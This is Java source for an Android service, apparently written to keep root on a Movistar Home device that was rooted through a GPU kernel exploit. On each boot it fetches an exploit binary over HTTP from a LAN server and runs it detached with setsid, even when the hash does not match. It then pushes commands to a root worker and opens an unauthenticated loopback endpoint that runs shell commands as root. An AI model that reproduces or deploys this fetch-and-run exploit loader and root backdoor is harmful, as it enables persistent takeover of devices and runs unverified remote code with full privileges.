package com.mh.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.security.MessageDigest;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPInputStream;

/* MH Agent v4 -- permanence for the Movistar Home (ASKEY RG3205W).
 *
 * The box is rooted through CVE-2021-1905, but a root shell is not durable by
 * itself: it dies with the reboot, and the transport that drives it (Termux's
 * sshd) dies whenever lmkd reaps the Termux app -- observed in practice, a live
 * root worker ending up unreachable while the kernel was otherwise
 * fine.  So this app starts itself on every boot, runs the payload at the right
 * moment, and is the launcher-side half of a root mailbox.
 *
 * What v3 fixes (v2 never fired once, which is why it exists):
 *   - uptime(): SystemClock.elapsedRealtime().  v2 read field 22 of /proc/self/stat,
 *     which is the start time of the READER -- true for a freshly exec'd shell (the
 *     job), frozen for a long-lived app process.  v2 held its 89s, re-read the same
 *     41s and declined forever: it could never fire.
 *   - firing policy: fire as soon as the service is up, unless past 181s (then wait
 *     for the next boot).  Early is fine: the payload self-aligns to 128s.
 *   - window: every successful roll happened at 128..181s of uptime (win was 133s).
 *     At ~320s the same payload missed and wedged the GPU; the box needed the plug.
 *   - crash backoff: a boot that dies mid-run leaves run.marker behind.  Each such
 *     death costs an automatic retry; after two, v3 stops firing on its own and
 *     the box stays up.  A crash loop is not possible.
 *   - POST /stop disarms it remotely; POST /run forces one run.
 *
 * Deliberately never touches the nav bar APK or anything the user is running.
 *
 * v4: after a win it installs BootKeeper itself.  The payload
 * starts its root worker with MH_MAILBOX=<this app's files dir>, so mailbox D1
 * IS this dir -- and the worker serves D1 before Termux's home (D2).  v4 waits
 * for a LIVE worker (rsh.alive is rewritten every loop; a changing mtime is
 * the proof, and stat works for apps while reading that file does not), then
 * fetches bk-stroke.sh from the Mac (extracted live from job.sh -- one source
 * of truth), writes it into rootcmd, re-asserts it if a foreign writer
 * clobbers the mailbox, and waits for __BK_END__ in rootout.txt (the worker
 * chowns its output to this app, so the round output IS readable).  A service
 * restart on the same boot never refires the payload; it resumes the drive if
 * a live worker is found instead (lmkd reaping this app mid-run is expected).
 */
public class AgentService extends Service {

    static final String V = "mh-agent/4";
    static final String SRV = "http://192.168.1.101:8010";
    static final String WANT_GZ = "8264cf92d1425ca762c8354b44f395ad";  /* G11 gunzip; gz is d0894101 */
    static final int CTL_PORT = 8080;
    static final long FIRE_MAX = 181;   /* measured window is 128..181s of uptime; the win was 133s */

    File dir, logfile;
    volatile String state = "init";
    volatile String why0 = "service";
    volatile boolean busy = false;
    volatile boolean forced = false;

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onCreate() {
        super.onCreate();
        dir = getFilesDir();
        logfile = new File(dir, "mh-agent.log");
        startForeground(1, notif("starting"));
        new Thread(new Runnable() { public void run() { ctl(); } }, "ctl").start();
    }

    @Override public int onStartCommand(Intent i, int f, int s) {
        if (i != null && i.getStringExtra("why") != null) why0 = i.getStringExtra("why");
        final String why = why0;
        new Thread(new Runnable() { public void run() { boot(why); } }, "agent").start();
        return START_STICKY;
    }

    /* ---------------- plumbing ---------------- */

    Notification notif(String text) {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(
                    new NotificationChannel("mh", "MH Agent", NotificationManager.IMPORTANCE_MIN));
        }
        PendingIntent pi = PendingIntent.getActivity(this, 0,
                new Intent(this, MainActivity.class), PendingIntent.FLAG_IMMUTABLE);
        Notification.Builder b = (Build.VERSION.SDK_INT >= 26)
                ? new Notification.Builder(this, "mh") : new Notification.Builder(this);
        return b.setContentTitle("MH Agent").setContentText(text)
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setContentIntent(pi).setOngoing(true).build();
    }

    void L(String s) {
        state = s;
        try {
            FileWriter w = new FileWriter(logfile, true);
            w.write(System.currentTimeMillis() + " " + s + "\n");
            w.close();
        } catch (Throwable t) { /* logging must never be fatal */ }
    }

    static String read(File f) {
        try {
            if (!f.exists() || f.length() <= 0) return "";
            byte[] b = new byte[(int) f.length()];
            FileInputStream in = new FileInputStream(f);
            int got = 0;
            while (got < b.length) { int n = in.read(b, got, b.length - got); if (n < 0) break; got += n; }
            in.close();
            return new String(b, 0, got, "UTF-8");
        } catch (Throwable t) { return ""; }
    }

    /* /proc files claim length 0 -- reading them by length is how v1 managed to
       believe the uptime was -1 and fired whenever it felt like it. */
    static String readStream(File f) {
        try {
            InputStream in = new FileInputStream(f);
            ByteArrayOutputStream o = new ByteArrayOutputStream();
            byte[] b = new byte[4096];
            int n;
            while ((n = in.read(b)) > 0) o.write(b, 0, n);
            in.close();
            return new String(o.toByteArray(), "UTF-8");
        } catch (Throwable t) { return ""; }
    }

    static void write(File f, String s) {
        try {
            FileOutputStream o = new FileOutputStream(f, false);
            o.write(s.getBytes("UTF-8"));
            o.close();
        } catch (Throwable t) { }
    }

    static String tail(File f, int lines) {
        String s = read(f);
        String[] a = s.split("\n");
        if (a.length <= lines) return s;
        StringBuilder sb = new StringBuilder();
        for (int i = a.length - lines; i < a.length; i++) sb.append(a[i]).append('\n');
        return sb.toString();
    }

    static long uptime() {
        /* SystemClock.elapsedRealtime() IS device uptime, in milliseconds.  v2 read
           field 22 of /proc/self/stat -- the start time of the READER.  That is
           correct for a freshly exec'd shell (how the job uses it) but frozen for a
           long-lived app process: v2 held its 89s, re-read the same 41s and declined
           forever.  Measured on this box. */
        return android.os.SystemClock.elapsedRealtime() / 1000L;
    }

    static String md5(File f) {
        try {
            MessageDigest d = MessageDigest.getInstance("MD5");
            FileInputStream in = new FileInputStream(f);
            byte[] b = new byte[8192];
            int n;
            while ((n = in.read(b)) > 0) d.update(b, 0, n);
            in.close();
            StringBuilder sb = new StringBuilder();
            for (byte x : d.digest()) sb.append(String.format("%02x", x));
            return sb.toString();
        } catch (Throwable t) { return "?"; }
    }

    void post(String body) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(SRV + "/").openConnection();
            c.setDoOutput(true);
            c.setConnectTimeout(8000);
            c.setReadTimeout(15000);
            c.setRequestMethod("POST");
            OutputStream o = c.getOutputStream();
            o.write(body.getBytes("UTF-8"));
            o.close();
            c.getResponseCode();
            c.disconnect();
        } catch (Throwable t) { }
    }

    boolean fetch(File out) {
        try {
            File gz = new File(dir, "kgsl-forge.gz");
            HttpURLConnection c = (HttpURLConnection) new URL(SRV + "/kgsl-forge.gz").openConnection();
            c.setConnectTimeout(8000);
            c.setReadTimeout(30000);
            if (c.getResponseCode() != 200) { c.disconnect(); return false; }
            InputStream in = c.getInputStream();
            FileOutputStream o = new FileOutputStream(gz);
            byte[] buf = new byte[16384];
            int n;
            while ((n = in.read(buf)) > 0) o.write(buf, 0, n);
            o.close();
            in.close();
            c.disconnect();
            GZIPInputStream g = new GZIPInputStream(new FileInputStream(gz));
            FileOutputStream o2 = new FileOutputStream(out);
            while ((n = g.read(buf)) > 0) o2.write(buf, 0, n);
            o2.close();
            g.close();
            out.setExecutable(true, false);
            return out.length() > 1000;
        } catch (Throwable t) { L("fetch failed: " + t); return false; }
    }

    static String bootToken() {
        /* A UUID the kernel regenerates on every boot.  When an app can read it,
           "same boot?" stops being guesswork.  Not readable -> "" (fallback). */
        String s = readStream(new File("/proc/sys/kernel/random/boot_id")).trim();
        return s.length() > 8 ? s : "";
    }

    boolean freshWorker() {
        /* True when rsh.alive is being REWRITTEN right now.  The worker touches
           it on every loop iteration (~1s); a stale root-owned leftover from an
           old win has a frozen mtime and cannot fake liveness.  stat() works for
           this app even on root-owned files; reading them does not (and the
           content is only "alive"). */
        File f = new File(dir, "rsh.alive");
        try {
            for (int i = 0; i < 4; i++) {
                long m1 = f.lastModified();
                Thread.sleep(2500);
                if (f.exists() && f.lastModified() != m1) return true;
            }
        } catch (Throwable t) { }
        return false;
    }

    String fetchText(String name) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(SRV + "/" + name).openConnection();
            c.setConnectTimeout(8000);
            c.setReadTimeout(20000);
            if (c.getResponseCode() != 200) { c.disconnect(); return ""; }
            InputStream in = c.getInputStream();
            ByteArrayOutputStream o = new ByteArrayOutputStream();
            byte[] b = new byte[4096];
            int n;
            while ((n = in.read(b)) > 0) o.write(b, 0, n);
            in.close();
            c.disconnect();
            return new String(o.toByteArray(), "UTF-8");
        } catch (Throwable t) { L("fetchText " + name + " failed: " + t); return ""; }
    }

    /* v4: the point of the whole app -- drive the fresh root worker to install
       BootKeeper over THIS app's private mailbox (D1, served first).  Returns a
       summary for the RESULT post; the Mac also watches its own log for
       "GET /BootKeeper.apk" -- proof the stroke ran as root. */
    String bkDrive() {
        File rc = new File(dir, "rootcmd");
        File ro = new File(dir, "rootout.txt");
        String stroke = "";
        for (int i = 1; i <= 5 && stroke.length() < 100; i++) {
            stroke = fetchText("bk-stroke.sh");
            if (stroke.length() < 100) {
                L("BK: stroke fetch " + i + " failed");
                try { Thread.sleep(1500); } catch (Throwable t) { }
            }
        }
        if (stroke.length() < 100) {
            post("AGENT " + V + ": BK stroke fetch failed");
            return "(BK stroke fetch failed)";
        }
        if (!stroke.endsWith("\n")) stroke += "\n";
        ro.delete();                     /* app-readable output: clear the old round */
        write(rc, stroke);
        L("BK: stroke -> rootcmd (" + stroke.length() + "B); waiting for __BK_END__");
        post("AGENT " + V + ": BK stroke -> worker (" + stroke.length() + "B)");
        long t0 = System.currentTimeMillis();
        String last = "";
        boolean done = false;
        while (System.currentTimeMillis() - t0 < 120000L) {
            try { Thread.sleep(2000); } catch (Throwable t) { }
            last = read(ro);
            if (last.indexOf("__BK_END__") >= 0) { done = true; break; }
            if (rc.exists() && read(rc).indexOf("__BK_STROKE__") < 0) {
                /* a foreign writer overwrote the mailbox (the roll #20 disease);
                   the stroke must be the round the worker spends itself on */
                write(rc, stroke);
                L("BK: mailbox clobbered -- stroke re-asserted");
            }
        }
        L("BK: done=" + done + " rootout=" + last.length() + "B");
        return "done=" + done + " rootout=" + last.length() + "B\n" + last;
    }

    /* ---------------- the run ---------------- */

    void boot(String why) {
        if (busy) { L("run already in progress; ignoring (" + why + ")"); return; }
        busy = true;
        try {
            L(V + " up (" + why + ") dir=" + dir);
            post("AGENT " + V + ": service up (" + why + ")");
            File stopped = new File(dir, "stopped");
            File marker  = new File(dir, "run.marker");
            File failc   = new File(dir, "fail.count");
            int fails = 0;
            try { fails = Integer.parseInt(read(failc).trim()); } catch (Throwable t) { }

            if (marker.exists() && !forced) {
                String m = read(marker);
                String tok = bootToken();
                String mtok = "";
                Matcher mb = Pattern.compile("boot=([^\\s]+)").matcher(m);
                if (mb.find()) mtok = mb.group(1);
                long firedAt = -1;
                Matcher mf = Pattern.compile("fired at uptime (\\d+)s").matcher(m);
                if (mf.find()) try { firedAt = Long.parseLong(mf.group(1)); } catch (Throwable t) { }
                boolean sameBoot;
                if (tok.length() > 0 && mtok.length() > 0)
                    sameBoot = mtok.equals(tok);                       /* definite, either way */
                else if (firedAt >= 0)
                    sameBoot = uptime() >= firedAt;                    /* fallback heuristic */
                else
                    sameBoot = false;
                if (sameBoot) {
                    /* lmkd reaped this app while the run was in flight (expected under
                       the exploit's memory pressure).  This boot's payload ownership is
                       spent -- firing again would put two payloads on one boot, and we
                       never do that.  If the worker survived, resume the drive here. */
                    L("service restarted on the same boot (fired at " + firedAt
                      + "s, now " + uptime() + "s); not re-firing");
                    post("AGENT " + V + ": same-boot restart; not re-firing");
                    if (freshWorker()) {
                        post("AGENT " + V + ": live worker on restart -> BK recovery drive");
                        String bk = bkDrive();
                        post("AGENT " + V + ": BK recovery result\n" + bk);
                    }
                    write(marker, "confirmed at uptime " + uptime() + "s boot=" + bootToken() + "\n");
                    busy = false; return;
                }
                if (m.indexOf("confirmed") >= 0) {
                    /* the previous boot's run completed and reported -- nothing to retry */
                    marker.delete();
                } else {
                    /* A new boot (its uptime/token reset) whose last run never confirmed:
                       that boot died between firing and a live worker.  Without this the
                       box would crash-loop forever (each death costs one automatic
                       retry; two -> stop). */
                    marker.delete();
                    fails++;
                    write(failc, String.valueOf(fails));
                    L("previous run never confirmed -> the boot died mid-run; consecutive=" + fails);
                    post("AGENT " + V + ": previous run did not confirm; failures=" + fails);
                }
            }
            if (!forced && stopped.exists()) {
                L("stopped flag is set; not firing"); busy = false; return;
            }
            if (!forced && fails >= 2) {
                L("fail.count=" + fails + ": refusing to fire on its own again -- the box stays up."
                  + "  POST /run to force, or the payload can be swapped on the server.");
                post("AGENT " + V + ": backoff engaged, not firing");
                busy = false; return;
            }

            /* Fetch first, wait after: the window wait must not be polluted by
               network time (v1 spent ~60s here and fired late because of it). */
            File bin = new File(dir, "kgsl-forge");
            bin.delete();
            for (int i = 1; i <= 10 && (!bin.exists() || bin.length() < 1000); i++) {
                fetch(bin);
                if (!bin.exists() || bin.length() < 1000) {
                    L("fetch attempt " + i + " failed");
                    Thread.sleep(1500);
                }
            }
            if (!bin.exists() || bin.length() < 1000) {
                L("FATAL: no payload"); post("AGENT " + V + ": no payload"); busy = false; return;
            }
            String got = md5(bin);
            L("payload " + bin.length() + "B md5=" + got
              + (got.equals(WANT_GZ) ? " (expected)" : " (server copy differs from WANT_GZ -- proceeding)"));

            long up = uptime();
            if (!forced && up > FIRE_MAX) {
                L("uptime " + up + "s is past the window -> waiting for the next boot "
                  + "(a late race wedges the GPU)");
                post("AGENT " + V + ": up, past window, waiting for next boot");
                busy = false; return;
            }
            /* Fire now.  The payload is a FRESH process, so its own uptime read is
               correct and it self-aligns to 128s before it touches KGSL.  Alignment
               belongs in the one process that actually races. */
            forced = false;           /* a forced run is one shot; guards re-arm */
            L("FIRING at uptime " + up + "s (payload self-aligns to 128s if early)");
            write(marker, "fired at uptime " + up + "s, wall " + System.currentTimeMillis()
                    + " boot=" + bootToken() + "\n");
            post("AGENT " + V + ": firing at uptime " + up + "s");

            /* v4: this dir survives reboots and old wins leave files behind.
               rootout/worker2/rootproof are chowned to this app (deletable);
               rsh.alive may be root-owned (delete can fail) -- liveness is then
               judged by its mtime changing, never by existence alone. */
            for (String stale : new String[]{"rsh.alive", "rootout.txt", "worker2.txt", "rootproof.txt", "rootcmd"}) {
                new File(dir, stale).delete();
            }

            /* Detached on purpose: `setsid` gives it its own session, so when lmkd
               reaps this app (it will, under the exploit's memory pressure) the
               payload and the root worker it forks keep running. */
            ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c",
                    "cd " + dir + " && exec setsid ./kgsl-forge");
            pb.redirectErrorStream(true);
            pb.redirectOutput(new File(dir, "kgsl-out.txt"));
            pb.environment().put("MH_MAILBOX", dir.getAbsolutePath());
            pb.start();

            String proof = "";
            boolean alive = false;
            long prevM = -1;
            for (int i = 0; i < 60 && !alive; i++) {
                Thread.sleep(5000);
                File f = new File(dir, "rsh.alive");
                if (!f.exists()) { prevM = -1; continue; }   /* nothing yet, or gone */
                long m = f.lastModified();
                if (prevM != -1 && m != prevM) {             /* rewritten => live worker */
                    alive = true;
                    proof = read(new File(dir, "worker2.txt")) + read(new File(dir, "rootproof.txt"));
                    L("ROOT WORKER ALIVE after " + (i * 5) + "s (mtime moving)");
                }
                prevM = m;
            }
            String bk = alive ? bkDrive() : "(no live worker; BK not attempted)";
            /* the run finished and is being reported; leave a confirmed marker so a
               sticky restart (or the next boot) never treats this as a crash and
               never refires on this boot */
            write(marker, "confirmed at uptime " + uptime() + "s boot=" + bootToken() + "\n");
            write(failc, "0");
            post("AGENT " + V + " RESULT\n" + (proof.length() > 0 ? proof : "(run finished, no worker)")
                    + "\n--- BK drive ---\n" + bk
                    + "\n--- sshd2.log ---\n" + tail(new File(dir, "sshd2.log"), 10)
                    + "--- kgsl-out tail ---\n" + tail(new File(dir, "kgsl-out.txt"), 25));
            L("run finished; control server is on :" + CTL_PORT);
        } catch (Throwable t) {
            L("run error: " + t);
        }
        busy = false;
    }

    /* ---------------- control channel ----------------
       GET  /status  -- state, uptime, worker, proof
       GET  /log     -- agent log tail
       GET  /run     -- fire once now (clears the stop flag and the backoff)
       GET  /stop    -- disarm: never fire on its own again until /run
       POST /cmd     -- body is a shell command, answered by the ROOT worker
    */
    void ctl() {
        try {
            /* Loopback-only: the control channel runs a shell as uid 0 with no
               authentication, so it must never be reachable off-device. Reach it
               over the SSH tunnel (-L 8080:127.0.0.1:8080) rather than the LAN. */
            ServerSocket ss = new ServerSocket(CTL_PORT, 50,
                    java.net.InetAddress.getByName("127.0.0.1"));
            L("control server listening on 127.0.0.1:" + CTL_PORT);
            while (true) {
                Socket s = ss.accept();
                try { handle(s); } catch (Throwable t) { L("ctl error: " + t); }
                try { s.close(); } catch (Throwable t) { }
            }
        } catch (Throwable t) {
            L("control server FAILED: " + t);
        }
    }

    static String readLine(InputStream in) throws Exception {
        StringBuilder sb = new StringBuilder();
        int c;
        while ((c = in.read()) >= 0) {
            if (c == '\n') break;
            if (c != '\r') sb.append((char) c);
            if (sb.length() > 900) break;
        }
        return sb.toString();
    }

    void handle(Socket s) throws Exception {
        s.setSoTimeout(20000);
        BufferedInputStream in = new BufferedInputStream(s.getInputStream());
        String req = readLine(in);
        String[] r = req.split(" ");
        String path = r.length > 1 ? r[1] : "/";
        int clen = 0;
        while (true) {
            String h = readLine(in);
            if (h == null || h.length() == 0) break;
            int c = h.indexOf(':');
            if (c > 0 && h.substring(0, c).trim().equalsIgnoreCase("Content-Length"))
                try { clen = Integer.parseInt(h.substring(c + 1).trim()); } catch (Throwable t) { }
        }
        byte[] body = new byte[0];
        if (clen > 0) {
            body = new byte[clen];
            int got = 0;
            while (got < clen) {
                int n = in.read(body, got, clen - got);
                if (n < 0) break;
                got += n;
            }
        }
        String out;
        if (path.startsWith("/cmd") && clen > 0) {
            String cmd = new String(body, "UTF-8").trim();
            File rc = new File(dir, "rootcmd");
            File ro = new File(dir, "rootout.txt");
            if (ro.exists()) ro.delete();
            write(rc, cmd + "\n");
            String res = "";
            for (int i = 0; i < 60; i++) {
                res = read(ro);
                if (res.indexOf("__RC=") >= 0) break;
                Thread.sleep(500);
            }
            out = res.length() > 0 ? res : "(no output: root worker not up yet -- GET /status)";
        } else if (path.startsWith("/status")) {
            out = "version: " + V
                + "\nstate: " + state
                + "\nuptime: " + uptime() + "s"
                + "\nfail.count: " + read(new File(dir, "fail.count")).trim()
                + "\nrun.marker: " + new File(dir, "run.marker").exists()
                + "\nstopped: " + new File(dir, "stopped").exists()
                + "\nworker alive: " + new File(dir, "rsh.alive").exists()
                + " mtime=" + new File(dir, "rsh.alive").lastModified()
                + "\nsshd2 pid: " + read(new File(dir, "sshd2.pid")).trim()
                + "\n--- worker2.txt ---\n" + read(new File(dir, "worker2.txt"))
                + "--- rootproof.txt ---\n" + read(new File(dir, "rootproof.txt"))
                + "--- agent log tail ---\n" + tail(logfile, 30);
        } else if (path.startsWith("/log")) {
            out = tail(logfile, 200);
        } else if (path.startsWith("/run")) {
            forced = true;
            new File(dir, "stopped").delete();
            write(new File(dir, "fail.count"), "0");
            new Thread(new Runnable() { public void run() { boot("http-run"); } }).start();
            out = "forced run triggered (ignores window, stop flag and backoff)\n";
        } else if (path.startsWith("/stop")) {
            write(new File(dir, "stopped"), V + ": disarmed\n");
            out = "stopped: will not fire on its own until /run\n";
        } else {
            out = "MH Agent " + V + ". paths: /status /log /run /stop  |  POST /cmd with a shell command\n";
        }
        byte[] b = out.getBytes("UTF-8");
        OutputStream o = s.getOutputStream();
        o.write(("HTTP/1.0 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: "
                + b.length + "\r\nConnection: close\r\n\r\n").getBytes("UTF-8"));
        o.write(b);
        o.flush();
    }
}
